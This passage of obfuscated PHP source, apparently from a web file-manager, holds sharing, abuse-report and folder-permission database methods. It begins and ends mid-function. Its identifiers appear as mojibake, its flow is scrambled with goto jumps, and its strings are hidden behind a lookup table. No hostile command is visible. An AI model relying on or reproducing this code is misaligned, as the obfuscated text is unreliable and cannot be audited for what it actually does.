œŒêÖ¾[83]) { Model($c¤ œŒêÖ¾[509])->eventShare($F¬¤…°ôŠÍ[$c¤ œŒêÖ¾[374]], $c¤ œŒêÖ¾[2183]); } } return $fè·¢ô³ˆ; goto D•Ø¦æÁµ; Eá‡ÑµÔ£: $c¤ œŒêÖ¾ =& $_SERVER[Ä¿Ş°¨]; if (is_array($d«‹×‹Æõ)) { $d«‹×‹Æõ = array($c¤ œŒêÖ¾[7], $d«‹×‹Æõ); } $FÆ„à„Ë“ó = array($c¤ œŒêÖ¾[445] => $d«‹×‹Æõ); goto CÂ·±³«ß“; D•Ø¦æÁµ: } protected function removeBySource($eŸÚ«Ã°ÚŠ) { goto bÛå¶ ö³Š; bÛå¶ ö³Š: $f…ëñŒÇá¡ =& $_SERVER[Ä¿Ş°¨]; $aÎÕ•÷²‡· = array($f…ëñŒÇá¡[388] => array($f…ëñŒÇá¡[389], $eŸÚ«Ã°ÚŠ)); $a’»øî§õ¥ = $this->field($f…ëñŒÇá¡[445])->where($aÎÕ•÷²‡·)->select(); goto FÄğÖ•­±Á; FÄğÖ•­±Á: $a’»øî§õ¥ = array_to_keyvalue($a’»øî§õ¥, $f…ëñŒÇá¡[33], $f…ëñŒÇá¡[445]); if (!$a’»øî§õ¥) { return; } $aÎÕ•÷²‡· = array($f…ëñŒÇá¡[444] => array($f…ëñŒÇá¡[389], $a’»øî§õ¥)); goto DíÃì‹Ñâğ; DíÃì‹Ñâğ: $this->where($aÎÕ•÷²‡·)->delete(); Model($f…ëñŒÇá¡[541])->where($aÎÕ•÷²‡·)->delete(); goto A§Ä“Õ–’”; A§Ä“Õ–’”: } public function listAll($DÃŞŸÀ³÷õ) { goto DŞ¿Ó»¡ÆŞ; E–‹ÈÔ¾£å: if ($DÃŞŸÀ³÷õ[$EŞ¿ŠÛ´¥×[696]]) { $f¨À—Šƒ«– = $DÃŞŸÀ³÷õ[$EŞ¿ŠÛ´¥×[697]] ? $DÃŞŸÀ³÷õ[$EŞ¿ŠÛ´¥×[697]] : strtotime(date($EŞ¿ŠÛ´¥×[2199])); $eŸĞç½¿[$EŞ¿ŠÛ´¥×[183]] = array($EŞ¿ŠÛ´¥×[317], array($DÃŞŸÀ³÷õ[$EŞ¿ŠÛ´¥×[696]], $f¨À—Šƒ«–)); } if ($DÃŞŸÀ³÷õ[$EŞ¿ŠÛ´¥×[29]]) { $eŸĞç½¿[$DÃŞŸÀ³÷õ[$EŞ¿ŠÛ´¥×[29]]] = 1; } else { $eŸĞç½¿[] = array($EŞ¿ŠÛ´¥×[450] => array($EŞ¿ŠÛ´¥×[913], 0), $EŞ¿ŠÛ´¥×[452] => array($EŞ¿ŠÛ´¥×[913], 0), $EŞ¿ŠÛ´¥×[2174] => $EŞ¿ŠÛ´¥×[2143]); } if ($DÃŞŸÀ³÷õ[$EŞ¿ŠÛ´¥×[2139]]) { $eŸĞç½¿[] = array($EŞ¿ŠÛ´¥×[447] => $DÃŞŸÀ³÷õ[$EŞ¿ŠÛ´¥×[2139]], $EŞ¿ŠÛ´¥×[1304] => array($EŞ¿ŠÛ´¥×[745], "\x25{$DÃŞŸÀ³÷õ[$EŞ¿ŠÛ´¥×[2139]]}\45"), $EŞ¿ŠÛ´¥×[2174] => $EŞ¿ŠÛ´¥×[2143]); } goto CÌÄÇëâ¯; b–Ä‡İ©ÉÏ: return $d¦˜Æ£¢¡; goto E‡êÙºÈ; DŞ¿Ó»¡ÆŞ: $EŞ¿ŠÛ´¥× =& $_SERVER[Ä¿Ş°¨]; $eŸĞç½¿ = array(); if ($DÃŞŸÀ³÷õ[$EŞ¿ŠÛ´¥×[1399]]) { $eŸĞç½¿[$EŞ¿ŠÛ´¥×[1399]] = $DÃŞŸÀ³÷õ[$EŞ¿ŠÛ´¥×[1399]]; } goto E–‹ÈÔ¾£å; CÌÄÇëâ¯: $d¦˜Æ£¢¡ = $this->_makeOrder()->where($eŸĞç½¿)->selectPage(20); if (empty($d¦˜Æ£¢¡[$EŞ¿ŠÛ´¥×[350]])) { return array(); } $this->_listDataApply($d¦˜Æ£¢¡[$EŞ¿ŠÛ´¥×[350]]); goto b–Ä‡İ©ÉÏ; E‡êÙºÈ: } public function listDataApply($C¢³¬¸§£õ) { $this->_listDataApply($C¢³¬¸§£õ); return $C¢³¬¸§£õ; } private function _listDataApply(&$b÷Ê¤¹ñÕ‘) { $C¡ÖÁÈÔ† =& $_SERVER[Ä¿Ş°¨]; $D†ã’¡øÎÚ = array_to_keyvalue($b÷Ê¤¹ñÕ‘, $C¡ÖÁÈÔ†[33], $C¡ÖÁÈÔ†[1399]); $Câ´áø˜ = Model($C¡ÖÁÈÔ†[481])->userListInfo(array_unique($D†ã’¡øÎÚ)); $d„ğ¡Ğ´ìÁ = array_to_keyvalue($b÷Ê¤¹ñÕ‘, $C¡ÖÁÈÔ†[33], $C¡ÖÁÈÔ†[374]); $d¥¸Œ×Ì«Ô = Model($C¡ÖÁÈÔ†[746])->sourceListInfo($d„ğ¡Ğ´ìÁ, !0); foreach ($b÷Ê¤¹ñÕ‘ as &$cö†ŞÌî²) { $f¾œ‡‹ê = $cö†ŞÌî²[$C¡ÖÁÈÔ†[1399]]; $cö†ŞÌî²[$C¡ÖÁÈÔ†[2200]] = $Câ´áø˜[$f¾œ‡‹ê] ? $Câ´áø˜[$f¾œ‡‹ê] : !1; $aâæ¾öÑ”¯ = $cö†ŞÌî²[$C¡ÖÁÈÔ†[374]]; $cö†ŞÌî²[$C¡ÖÁÈÔ†[396]] = $d¥¸Œ×Ì«Ô[$aâæ¾öÑ”¯] ? $d¥¸Œ×Ì«Ô[$aâæ¾öÑ”¯] : !1; } } private function _makeOrder($F™¿‚Ôâîö = '') { goto F…ß„â; AÊğ—¼ŠÙº: $d¯ªÇò—ñÉ = Input::get($E›×†›ù¥[411], $E›×†›ù¥[7], $E›×†›ù¥[394], $bëØÑ¾áƒ); $C‚†«¶‹™ = Input::get($E›×†›ù¥[412], $E›×†›ù¥[7], $E›×†›ù¥[2201], array($E›×†›ù¥[2138], $E›×†›ù¥[408])); $C‚†«¶‹™ = $A¯†ç“˜‰[$C‚†«¶‹™]; goto Bµ“§ó•¸İ; Bµ“§ó•¸İ: $F™¿‚Ôâîö = $F™¿‚Ôâîö . "{$d¯ªÇò—ñÉ}\40{$C‚†«¶‹™}"; return $this->order($F™¿‚Ôâîö); goto Fß„ğˆ¼ÜÏ; F…ß„â: $E›×†›ù¥ =& $_SERVER[Ä¿Ş°¨]; $bëØÑ¾áƒ = array($E›×†›ù¥[183], $E›×†›ù¥[697], $E›×†›ù¥[2186], $E›×†›ù¥[2187]); $A¯†ç“˜‰ = array($E›×†›ù¥[406] => $E›×†›ù¥[407], $E›×†›ù¥[408] => $E›×†›ù¥[409]); goto AÊğ—¼ŠÙº; Fß„ğˆ¼ÜÏ: } public function reportAdd($Cæ—î¡¤Á³) { $e›Ó¬…¦™ä =& $_SERVER[Ä¿Ş°¨]; $b…»Ş”ø»İ = array($e›Ó¬…¦™ä[445] => $Cæ—î¡¤Á³[$e›Ó¬…¦™ä[445]], $e›Ó¬…¦™ä[1399] => USER_ID); if (Model($e›Ó¬…¦™ä[2197])->where($b…»Ş”ø»İ)->find()) { return !1; } $BµÛ÷°å¦À = array($e›Ó¬…¦™ä[445] => $Cæ—î¡¤Á³[$e›Ó¬…¦™ä[445]], $e›Ó¬…¦™ä[1304] => $Cæ—î¡¤Á³[$e›Ó¬…¦™ä[1304]], $e›Ó¬…¦™ä[374] => $Cæ—î¡¤Á³[$e›Ó¬…¦™ä[374]], $e›Ó¬…¦™ä[423] => $Cæ—î¡¤Á³[$e›Ó¬…¦™ä[423]], $e›Ó¬…¦™ä[1399] => USER_ID, $e›Ó¬…¦™ä[29] => $Cæ—î¡¤Á³[$e›Ó¬…¦™ä[29]], $e›Ó¬…¦™ä[409] => $Cæ—î¡¤Á³[$e›Ó¬…¦™ä[409]]); return Model($e›Ó¬…¦™ä[2197])->add($BµÛ÷°å¦À); } public function reportList($A–É ğÚ¶ä) { goto CŸÅÕ“†É; aŸ•ì®ä÷¢: if (isset($A–É ğÚ¶ä[$aÏÖ¿Š‰[29]]) && in_array($A–É ğÚ¶ä[$aÏÖ¿Š‰[29]], array($aÏÖ¿Š‰[83], $aÏÖ¿Š‰[2202], $aÏÖ¿Š‰[2203], $aÏÖ¿Š‰[2204], $aÏÖ¿Š‰[1879]))) { $CöÛ™°˜²[$aÏÖ¿Š‰[29]] = $A–É ğÚ¶ä[$aÏÖ¿Š‰[29]]; } if (isset($A–É ğÚ¶ä[$aÏÖ¿Š‰[683]]) && in_array($A–É ğÚ¶ä[$aÏÖ¿Š‰[683]], array($aÏÖ¿Š‰[472], $aÏÖ¿Š‰[83], $aÏÖ¿Š‰[2202], $aÏÖ¿Š‰[2203]))) { $CöÛ™°˜²[$aÏÖ¿Š‰[683]] = $A–É ğÚ¶ä[$aÏÖ¿Š‰[683]]; } $F‰æÙÄæã® = Input::get($aÏÖ¿Š‰[412], $aÏÖ¿Š‰[7], $aÏÖ¿Š‰[2201], array($aÏÖ¿Š‰[2138], $aÏÖ¿Š‰[408])); goto DÍ¸ÈóºË—; CŸÅÕ“†É: $aÏÖ¿Š‰ =& $_SERVER[Ä¿Ş°¨]; $CöÛ™°˜² = array(); if ($A–É ğÚ¶ä[$aÏÖ¿Š‰[696]]) { $cŞó•ÄĞ¶ = $A–É ğÚ¶ä[$aÏÖ¿Š‰[697]] ? $A–É ğÚ¶ä[$aÏÖ¿Š‰[697]] : strtotime(date($aÏÖ¿Š‰[2199])); $CöÛ™°˜²[$aÏÖ¿Š‰[183]] = array($aÏÖ¿Š‰[317], array($A–É ğÚ¶ä[$aÏÖ¿Š‰[696]], $cŞó•ÄĞ¶)); } goto aŸ•ì®ä÷¢; A“¾ƒçŞ‡á: if (empty($AÜÙ¢’²ö[$aÏÖ¿Š‰[350]])) { return array(); } $this->_listDataApply($AÜÙ¢’²ö[$aÏÖ¿Š‰[350]]); return $AÜÙ¢’²ö; goto Cí“Ç¸¼Æ‘; DÍ¸ÈóºË—: $b†Ò´Âˆ„ = array($aÏÖ¿Š‰[406] => $aÏÖ¿Š‰[407], $aÏÖ¿Š‰[408] => $aÏÖ¿Š‰[409]); $DÎòÔ²Ä‚ = $aÏÖ¿Š‰[2205] . $b†Ò´Âˆ„[$F‰æÙÄæã®]; $AÜÙ¢’²ö = Model($aÏÖ¿Š‰[2197])->where($CöÛ™°˜²)->order($DÎòÔ²Ä‚)->selectPage(20); goto A“¾ƒçŞ‡á; Cí“Ç¸¼Æ‘: } public function reportStatus($dä»©Ãáà) { goto fĞî‰ÚÚ‚™; Dò¤©Ò –š: return $DÁ¹×à°­ˆ; goto d¾ª÷çŠÌÁ; fĞî‰ÚÚ‚™: $C÷Óø‰’ŒÊ =& $_SERVER[Ä¿Ş°¨]; $fÖ—¿ñ…” = array($C÷Óø‰’ŒÊ[372] => $dä»©Ãáà[$C÷Óø‰’ŒÊ[372]]); $cÄÀ·Óù¥² = Model($C÷Óø‰’ŒÊ[2197])->where($fÖ—¿ñ…”)->field($C÷Óø‰’ŒÊ[2206])->find(); goto fÚ®éÅÙ; fÚ®éÅÙ: if (!$cÄÀ·Óù¥²) { return !1; } $f§‡¸˜Ö¹ = array($C÷Óø‰’ŒÊ[683] => $dä»©Ãáà[$C÷Óø‰’ŒÊ[683]]); if ($dä»©Ãáà[$C÷Óø‰’ŒÊ[683]] == $C÷Óø‰’ŒÊ[2203] && $cÄÀ·Óù¥²[$C÷Óø‰’ŒÊ[683]] == $C÷Óø‰’ŒÊ[2203]) { $f§‡¸˜Ö¹[$C÷Óø‰’ŒÊ[683]] = 0; } goto CââÄËÍÌ¯; CââÄËÍÌ¯: $DÁ¹×à°­ˆ = Model($C÷Óø‰’ŒÊ[2197])->where($fÖ—¿ñ…”)->save($f§‡¸˜Ö¹); if ($dä»©Ãáà[$C÷Óø‰’ŒÊ[683]] == $C÷Óø‰’ŒÊ[2202]) { if ($cÄÀ·Óù¥²[$C÷Óø‰’ŒÊ[423]] != $C÷Óø‰’ŒÊ[472] && $this->shareFileMeta($cÄÀ·Óù¥²[$C÷Óø‰’ŒÊ[423]])) { $this->shareFileMeta($cÄÀ·Óù¥²[$C÷Óø‰’ŒÊ[423]], 0); } return $this->remove($cÄÀ·Óù¥²[$C÷Óø‰’ŒÊ[445]]); } if ($DÁ¹×à°­ˆ && $dä»©Ãáà[$C÷Óø‰’ŒÊ[683]] == $C÷Óø‰’ŒÊ[2203]) { $C·º•Ø‘àÛ = $f§‡¸˜Ö¹[$C÷Óø‰’ŒÊ[683]] == $C÷Óø‰’ŒÊ[2203] ? 1 : 0; $this->shareFileMeta($cÄÀ·Óù¥²[$C÷Óø‰’ŒÊ[423]], $C·º•Ø‘àÛ); $this->removeByFile($cÄÀ·Óù¥²[$C÷Óø‰’ŒÊ[423]]); } goto Dò¤©Ò –š; d¾ª÷çŠÌÁ: } private function removeByFile($EŞùŒ÷·Æ™) { goto d³”Õ×­; Aò™°´çøê: $eœ»”Ô¿ = array($cº¶Şœ‡‹[374] => array($cº¶Şœ‡‹[7], $aõˆØ¦È¾), $cº¶Şœ‡‹[450] => 1); $dÛ»àÃß‰ = Model($cº¶Şœ‡‹[2040])->where($eœ»”Ô¿)->field($cº¶Şœ‡‹[445])->select(); if (empty($dÛ»àÃß‰)) { return; } goto AŒŒµ¿¸…‰; AŒŒµ¿¸…‰: $fŠí®ÉÎ¿‹ = array_to_keyvalue($dÛ»àÃß‰, $cº¶Şœ‡‹[33], $cº¶Şœ‡‹[445]); $this->remove($fŠí®ÉÎ¿‹); goto C­›Ò©«ˆò; d³”Õ×­: $cº¶Şœ‡‹ =& $_SERVER[Ä¿Ş°¨]; $dÛ»àÃß‰ = Model($cº¶Şœ‡‹[746])->where(array($cº¶Şœ‡‹[423] => $EŞùŒ÷·Æ™))->field($cº¶Şœ‡‹[374])->select(); $aõˆØ¦È¾ = array_to_keyvalue($dÛ»àÃß‰, $cº¶Şœ‡‹[33], $cº¶Şœ‡‹[374]); goto Aò™°´çøê; C­›Ò©«ˆò: } private function shareFileMeta($cÖó®é«ğÇ, $A†ø¾¹òùš = null) { $dèÑÔ¶Š” =& $_SERVER[Ä¿Ş°¨]; $cé¡èª” = array($dèÑÔ¶Š”[423] => $cÖó®é«ğÇ, $dèÑÔ¶Š”[89] => $dèÑÔ¶Š”[2207]); if (is_null($A†ø¾¹òùš)) { return Model($dèÑÔ¶Š”[2208])->where($cé¡èª”)->find(); } $cé¡èª”[$dèÑÔ¶Š”[355]] = $A†ø¾¹òùš; Model($dèÑÔ¶Š”[2208])->add($cé¡èª”, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\157\x75\x72\x63\x65\x5f\141\x75\x74\150"; public function getAuth($eŸÌ¡­ò¢‘) { goto dê™›óè¯ë; dê™›óè¯ë: $d½ô¡ ‘‰õ =& $_SERVER[Ä¿Ş°¨]; $E Í£Ãô¦Í = $d½ô¡ ‘‰õ[2209]; $CÍÄ¨ĞÒªÇ = array($d½ô¡ ‘‰õ[374] => $eŸÌ¡­ò¢‘); goto F³²é¾Ñ¼; F³²é¾Ñ¼: $fÊ´÷òÒ = $this->field($E Í£Ãô¦Í)->order($d½ô¡ ‘‰õ[372])->where($CÍÄ¨ĞÒªÇ)->select(); $dË¸Ó‹Ô¦ = array(); foreach ($fÊ´÷òÒ as $aÃŒ˜ÚîÌ) { if (Model($d½ô¡ ‘‰õ[2210])->listData($aÃŒ˜ÚîÌ[$d½ô¡ ‘‰õ[2191]])) { $dË¸Ó‹Ô¦[] = $aÃŒ˜ÚîÌ; } } goto dƒ°Ş»Ñó£; dƒ°Ş»Ñó£: return $dË¸Ó‹Ô¦; goto Aî”‚×´ª; Aî”‚×´ª: } public function setAuth($cóªÇÎ×ÀÏ, $eÜÈ÷¡¦¯®) { goto dŸÓäì·›; Fªì‡ëøÇ®: $eŞ†®ÓÚáÙ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $c××·Õ˜‘” = array(); foreach ($eÜÈ÷¡¦¯® as $a÷†ó§…ç®) { if (!in_array($a÷†ó§…ç®[$F´‘çŸ²Ó[376]], $eŞ†®ÓÚáÙ)) { show_json(LNG($F´‘çŸ²Ó[2211]), !1); } if ($e§œ¼ìÏ—Å != $D¦ö›Ëâå) { if ($a÷†ó§…ç®[$F´‘çŸ²Ó[376]] == SourceModel::TYPE_GROUP) { } if ($a÷†ó§…ç®[$F´‘çŸ²Ó[460]] != 0 && !in_array($a÷†ó§…ç®[$F´‘çŸ²Ó[460]], $FÑğï¨¡È)) { } } if ($a÷†ó§…ç®[$F´‘çŸ²Ó[460]] == 0) { $a÷†ó§…ç®[$F´‘çŸ²Ó[376]] = SourceModel::TYPE_USER; } $c××·Õ˜‘”[] = array($F´‘çŸ²Ó[374] => $cóªÇÎ×ÀÏ, $F´‘çŸ²Ó[376] => intval($a÷†ó§…ç®[$F´‘çŸ²Ó[376]]), $F´‘çŸ²Ó[460] => intval($a÷†ó§…ç®[$F´‘çŸ²Ó[460]]), $F´‘çŸ²Ó[2191] => intval($a÷†ó§…ç®[$F´‘çŸ²Ó[2191]]) ? intval($a÷†ó§…ç®[$F´‘çŸ²Ó[2191]]) : 0, $F´‘çŸ²Ó[2192] => intval($a÷†ó§…ç®[$F´‘çŸ²Ó[2192]]) ? intval($a÷†ó§…ç®[$F´‘çŸ²Ó[2192]]) : -1); } goto D„”ƒ‡Íœ©; E™Ó›‡ÄÄˆ: $D¦ö›Ëâå = 1; $e§œ¼ìÏ—Å = $aéê¼ƒò¡[$F´‘çŸ²Ó[460]]; if ($e§œ¼ìÏ—Å != $D¦ö›Ëâå) { $eùÔñ£„İ¬ = array($F´‘çŸ²Ó[2063] => $e§œ¼ìÏ—Å); $FÑğï¨¡È = Model($F´‘çŸ²Ó[2137])->field($F´‘çŸ²Ó[1399])->where($eùÔñ£„İ¬)->select(); $FÑğï¨¡È = array_to_keyvalue($FÑğï¨¡È, $F´‘çŸ²Ó[33], $F´‘çŸ²Ó[1399]); } goto Fªì‡ëøÇ®; D„”ƒ‡Íœ©: $this->where(array($F´‘çŸ²Ó[388] => $cóªÇÎ×ÀÏ))->delete(); $this->addAll($c××·Õ˜‘”); return !0; goto e¥Õëğ Î; dŸÓäì·›: $F´‘çŸ²Ó =& $_SERVER[Ä¿Ş°¨]; $aéê¼ƒò¡ = Model($F´‘çŸ²Ó[1095])->sourceInfo($cóªÇÎ×ÀÏ); if ($aéê¼ƒò¡[$F´‘çŸ²Ó[376]] != SourceModel::TYPE_GROUP) { return !1; } goto E™Ó›‡ÄÄˆ; e¥Õëğ Î: } public function authClear($FÌ£‡­î) { $Cï²‹œ³À› =& $_SERVER[Ä¿Ş°¨]; $E¬ÇÓìŒí = Model($Cï²‹œ³À›[1095])->sourceInfo($FÌ£‡­î); $eÔºø²‘Ô³ = array($FÌ£‡­î); if ($E¬ÇÓìŒí[$Cï²‹œ³À›[375]] == $Cï²‹œ³À›[83]) { $CÔ£ø¾ñ¾ = array($Cï²‹œ³À›[529] => array($Cï²‹œ³À›[487], $E¬ÇÓìŒí[$Cï²‹œ³À›[463]] . $FÌ£‡­î . $Cï²‹œ³À›[488])); $eÔºø²‘Ô³ = Model($Cï²‹œ³À›[1095])->field($Cï²‹œ³À›[388])->where($CÔ£ø¾ñ¾)->getField($Cï²‹œ³À›[374], !0); $eÔºø²‘Ô³[] = $FÌ£‡­î; } $this->where(array($Cï²‹œ³À›[388] => array($Cï²‹œ³À›[389], $eÔºø²‘Ô³)))->delete(); return !0; } public function get($c¨äÔ¹¾Çø) { $Aˆ£‰ÂÍ˜ = $this->getSourceList(array($c¨äÔ¹¾Çø), !0); return $Aˆ£‰ÂÍ˜[0]; } public function getSourceList($c½…ÏÅ Ä®, $BâçÕ¹É²ä = false) { goto F®¾“‡³İè; EŸ¶Áä™Ã: $BµÆ›¸õßÁ = array($Bè¸ä­Ôğ‹[388] => array($Bè¸ä­Ôğ‹[389], $bôè¿Èº¢œ)); $b©¡Ë¼–œ¶ = $this->field($e­‹‰ñ¼„Ô)->where($BµÆ›¸õßÁ)->select(); $b©¡Ë¼–œ¶ = array_to_keyvalue_group($b©¡Ë¼–œ¶, $Bè¸ä­Ôğ‹[374]); goto f‚ğ¾ğ”Š; f‚ğ¾ğ”Š: $Aâê‡»…¨ñ = array(); foreach ($BâçÕ¹É²ä as $f÷îÅ¦Áˆ => $aÍÁÅ¿‘æ) { $Aâê‡»…¨ñ[$f÷îÅ¦Áˆ] = $this->makeSourceAuth($aÍÁÅ¿‘æ, $b©¡Ë¼–œ¶); } return $Aâê‡»…¨ñ; goto E§¢°©ØñÜ; F®¾“‡³İè: $Bè¸ä­Ôğ‹ =& $_SERVER[Ä¿Ş°¨]; if (!$c½…ÏÅ Ä®) { return array(); } $B¶“¥îŞ®ó = Model($Bè¸ä­Ôğ‹[1095]); goto aîİœ­¶¢œ; aîİœ­¶¢œ: if (!$BâçÕ¹É²ä) { $BµÆ›¸õßÁ = array($Bè¸ä­Ôğ‹[388] => array($Bè¸ä­Ôğ‹[389], $c½…ÏÅ Ä®)); $BâçÕ¹É²ä = $B¶“¥îŞ®ó->field($Bè¸ä­Ôğ‹[2212])->where($BµÆ›¸õßÁ)->select(); $BâçÕ¹É²ä = array_to_keyvalue($BâçÕ¹É²ä, $Bè¸ä­Ôğ‹[374]); } $bôè¿Èº¢œ = $c½…ÏÅ Ä®; foreach ($BâçÕ¹É²ä as $a‡‰ŒÍ½˜ğ => $BËôºõ•£½) { $cÖØÑÍ²°Ù = $B¶“¥îŞ®ó->parentLevelArray($BËôºõ•£½[$Bè¸ä­Ôğ‹[463]]); $bôè¿Èº¢œ = array_merge($bôè¿Èº¢œ, $cÖØÑÍ²°Ù, array($a‡‰ŒÍ½˜ğ)); } goto EëŸÚ‘´ò; EëŸÚ‘´ò: $bôè¿Èº¢œ = array_values(array_unique($bôè¿Èº¢œ)); if (!$bôè¿Èº¢œ) { return array(); } $e­‹‰ñ¼„Ô = $Bè¸ä­Ôğ‹[2213]; goto EŸ¶Áä™Ã; E§¢°©ØñÜ: } public function authDeepCheck($e·è†ª¤Ï™, $Dõæâš‹¹ = false) { $e¯Ë‚Æ×¾ =& $_SERVER[Ä¿Ş°¨]; if (_get($GLOBALS, $e¯Ë‚Æ×¾[461])) { return !1; } $AâÊÆ³Ğ÷Ö = $this->makeAuthDeep(); if (!in_array($e·è†ª¤Ï™, $AâÊÆ³Ğ÷Ö)) { return !1; } return array($e¯Ë‚Æ×¾[382] => -1, $e¯Ë‚Æ×¾[422] => array($e¯Ë‚Æ×¾[390] => $e¯Ë‚Æ×¾[1016], $e¯Ë‚Æ×¾[2069] => $e¯Ë‚Æ×¾[472], $e¯Ë‚Æ×¾[391] => LNG($e¯Ë‚Æ×¾[2214]), $e¯Ë‚Æ×¾[2081] => $e¯Ë‚Æ×¾[2215])); } protected function makeAuthDeep() { goto fœÁÂù™‹¯; dÄö£ìÒØ²: $E¥¬ß¢Õç¨ = array_values(array_unique($E¥¬ß¢Õç¨)); foreach ($E¥¬ß¢Õç¨ as $A¡ŸÃØİÎÉ) { $d¿°ÙÌƒ… = $Cå¦İçèï²->getInfo($A¡ŸÃØİÎÉ); $Fœ‡¾“Ø‰[] = $d¿°ÙÌƒ…[$CŞƒê×[396]][$CŞƒê×[374]]; } $Fœ‡¾“Ø‰ = array_values(array_unique($Fœ‡¾“Ø‰)); goto Aë‚‹÷Ÿå; Aë‚‹÷Ÿå: return $Fœ‡¾“Ø‰; goto fÆ‡ÅâÛ¾‰; eˆËÌœÒ“…: $EÍŠí¤’­ó = Model($CŞƒê×[2216])->listData(); $c…—‹„¼¹Ô = array(); foreach ($EÍŠí¤’­ó as $FË†Ÿë¿ù¾) { if ($FË†Ÿë¿ù¾[$CŞƒê×[381]] == 0 && $FË†Ÿë¿ù¾[$CŞƒê×[2083]] == $CŞƒê×[83]) { $c…—‹„¼¹Ô[] = $FË†Ÿë¿ù¾[$CŞƒê×[372]]; } } goto FÚ½»ë‹Ûª; E¸ä£´Õ¢‹: if ($c…±—©æ»Ù) { $D´¤²ãŸõ¹ = array(array($CŞƒê×[376] => SourceModel::TYPE_USER, $CŞƒê×[460] => USER_ID), array($CŞƒê×[376] => SourceModel::TYPE_GROUP, $CŞƒê×[460] => array($CŞƒê×[389], $c…±—©æ»Ù)), $CŞƒê×[901] => $CŞƒê×[2143]); } if ($c…—‹„¼¹Ô) { $D´¤²ãŸõ¹ = array($D´¤²ãŸõ¹, $CŞƒê×[2191] => array($CŞƒê×[2217], $c…—‹„¼¹Ô)); } $A¿©™ŒÖ“å = $this->field($CŞƒê×[2218])->where($D´¤²ãŸõ¹)->select(); goto DÜ¨î…çÙÂ; D÷›ÊÉÈ÷ç: $E¥¬ß¢Õç¨ = array_values(array_unique($E¥¬ß¢Õç¨)); $AØ‘²ñé²™ = $E¥¬ß¢Õç¨; foreach ($AØ‘²ñé²™ as $A¡ŸÃØİÎÉ) { $d¿°ÙÌƒ… = $Cå¦İçèï²->getInfo($A¡ŸÃØİÎÉ); $CÆİ¦‰È¤ = $eÎæÂÈáó->parentLevelArray($d¿°ÙÌƒ…[$CŞƒê×[463]]); $E¥¬ß¢Õç¨ = array_merge($E¥¬ß¢Õç¨, $CÆİ¦‰È¤); } goto dÄö£ìÒØ²; DÜ¨î…çÙÂ: $D´Æ™œÊä‡ = array_to_keyvalue($A¿©™ŒÖ“å, $CŞƒê×[33], $CŞƒê×[374]); $Fœ‡¾“Ø‰ = array(); $E¥¬ß¢Õç¨ = $c…±—©æ»Ù; goto a§ìÚÁÙáœ; fœÁÂù™‹¯: $CŞƒê× =& $_SERVER[Ä¿Ş°¨]; static $Fœ‡¾“Ø‰ = false; if ($Fœ‡¾“Ø‰) { return $Fœ‡¾“Ø‰; } goto eˆËÌœÒ“…; FÚ½»ë‹Ûª: $c…±—©æ»Ù = Session::get($CŞƒê×[2175]); $c…±—©æ»Ù = array_to_keyvalue($c…±—©æ»Ù, $CŞƒê×[33], $CŞƒê×[2063]); $D´¤²ãŸõ¹ = array($CŞƒê×[376] => SourceModel::TYPE_USER, $CŞƒê×[460] => USER_ID); goto E¸ä£´Õ¢‹; a§ìÚÁÙáœ: $eÎæÂÈáó = Model($CŞƒê×[1095]); $Cå¦İçèï² = Model($CŞƒê×[462]); if ($D´Æ™œÊä‡) { $CÆó‘ÔŒÃœ = $eÎæÂÈáó->where(array($CŞƒê×[374] => array($CŞƒê×[389], $D´Æ™œÊä‡)))->select(); foreach ($CÆó‘ÔŒÃœ as $C™’Î³ï ¤) { $CÆİ¦‰È¤ = $eÎæÂÈáó->parentLevelArray($C™’Î³ï ¤[$CŞƒê×[463]]); $Fœ‡¾“Ø‰ = array_merge($Fœ‡¾“Ø‰, $CÆİ¦‰È¤); $E¥¬ß¢Õç¨[] = $C™’Î³ï ¤[$CŞƒê×[460]]; } } goto D÷›ÊÉÈ÷ç; fÆ‡ÅâÛ¾‰: } private function makeSourceAuth($då‚ôŒİ¦‹, $C¤Ñ…·˜ÉÓ) { goto dÍ¸ã±¥ˆ½; B¦˜İ³³á‹: $dÑÌ´š¨ = array_merge(array($då‚ôŒİ¦‹[$E…¾ÊÊÍ”ô[374]]), array_reverse($dÑÌ´š¨)); $Cœ¨Ò›¸é = !1; foreach ($dÑÌ´š¨ as $Dİ»ëãŸà¶) { if (!isset($C¤Ñ…·˜ÉÓ[$Dİ»ëãŸà¶])) { continue; } $eˆÑì¦•‹ø = $this->authMake($C¤Ñ…·˜ÉÓ[$Dİ»ëãŸà¶]); if ($eˆÑì¦•‹ø[$E…¾ÊÊÍ”ô[422]]) { $Cœ¨Ò›¸é = $eˆÑì¦•‹ø; break; } } goto eº£Ó“¾÷; dÍ¸ã±¥ˆ½: $E…¾ÊÊÍ”ô =& $_SERVER[Ä¿Ş°¨]; $e‹ ïØÀ¬ = Session::get($E…¾ÊÊÍ”ô[2175]); $dÑÌ´š¨ = Model($E…¾ÊÊÍ”ô[1095])->parentLevelArray($då‚ôŒİ¦‹[$E…¾ÊÊÍ”ô[463]]); goto B¦˜İ³³á‹; eº£Ó“¾÷: if (!$Cœ¨Ò›¸é) { $e‹ ïØÀ¬ = array_to_keyvalue($e‹ ïØÀ¬, $E…¾ÊÊÍ”ô[2063]); $c¤í†Ó¾š­ = $då‚ôŒİ¦‹[$E…¾ÊÊÍ”ô[460]]; $b ÍÍ¼ …£ = isset($e‹ ïØÀ¬[$c¤í†Ó¾š­]) ? $e‹ ïØÀ¬[$c¤í†Ó¾š­] : !1; if ($b ÍÍ¼ …£) { $Cœ¨Ò›¸é = array($E…¾ÊÊÍ”ô[2219] => intval($b ÍÍ¼ …£[$E…¾ÊÊÍ”ô[381]][$E…¾ÊÊÍ”ô[381]]), $E…¾ÊÊÍ”ô[2220] => $b ÍÍ¼ …£[$E…¾ÊÊÍ”ô[381]]); } } if ((!$Cœ¨Ò›¸é || $Cœ¨Ò›¸é[$E…¾ÊÊÍ”ô[382]] <= 0) && $då‚ôŒİ¦‹[$E…¾ÊÊÍ”ô[376]] == SourceModel::TYPE_GROUP) { $b³ÜœÎ¡Š = $this->authDeepCheck($då‚ôŒİ¦‹[$E…¾ÊÊÍ”ô[374]], $Cœ¨Ò›¸é); if ($b³ÜœÎ¡Š) { $Cœ¨Ò›¸é = $b³ÜœÎ¡Š; } } return $Cœ¨Ò›¸é; goto CÁ³Øš‘áÙ; CÁ³Øš‘áÙ: } public function authOwnerApply($cÂ–ÅÙ…ŠÛ) { goto FÔñÅ²; c¶°‰›ö: $A¡äœñÄƒ = 